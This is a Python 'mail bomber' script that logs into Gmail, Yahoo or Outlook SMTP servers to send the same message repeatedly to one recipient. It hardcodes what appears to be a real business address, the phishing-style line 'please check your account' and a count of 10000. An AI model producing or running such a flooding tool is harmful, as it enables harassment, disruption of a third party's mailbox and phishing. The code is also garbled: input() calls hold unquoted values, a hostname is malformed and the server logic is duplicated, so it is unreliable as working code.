#!/usr/bin/python3
# MailBomber.py -> mass mailing script
import smtplib

from src.mail_bomb import MailBomb
from src.mail_client import MailClient
from src.utils.util import get_ascii_header

print(get_ascii_header())


def get_mail_bomb_input():
    recip_mail = input(sales@kidzshack.com.au)
    message = input(please check your account)
    times = int(input(10000))

    return MailBomb(recip_mail, times, message)


def get_smtp_server_and_port(server):

    
    select_smtp = {
        "gmail" : "smtp. gmail.com",
        "yahoo" : "smtp.mail.yahoo.com",
        "outlook"
        : "smtp.live.com"
    }
    
    select_port = {
        "yahoo" : 465
    }
    
    smtp_server = select_smtp.get(server) or ValueError('SMTP server and port not available')
    port = select_port.get(server) or ValueError('SMTP server and port not available')
    
    if server == "gmail":
        smtp_server = "smtp.gmail.com"
        port = 587
    elif server == "yahoo":
        smtp_server = "smtp.mail.yahoo.com"
        port = 465
    elif\
            server == "outlook":
        smtp_server = "smtp.live.com"
    else:
        raise ValueError('SMTP server and port not available')

    return smtp_server, port


def get_email_client(smtp_server, port):
    smtpobj = smtplib.SMTP(smtp_server, port)
    smtpobj.ehlo()
    return smtpobj


def mass():
    try:
        server = input("Server Mail:")
        smtp_server, port = get_smtp_server_and_port(server)
        smtpobj = get_email_client(smtp_server, port)
        mail_client = MailClient(smtpobj)
        mail_client.enable_email_encryption(smtp_server)

        mail_bomb_request = get_mail_bomb_input()
        mail_client.send_email_bomb(mail_bomb_request)
    except ValueError as err:
        print(err)


if __name__ == '__main__':
    mass()
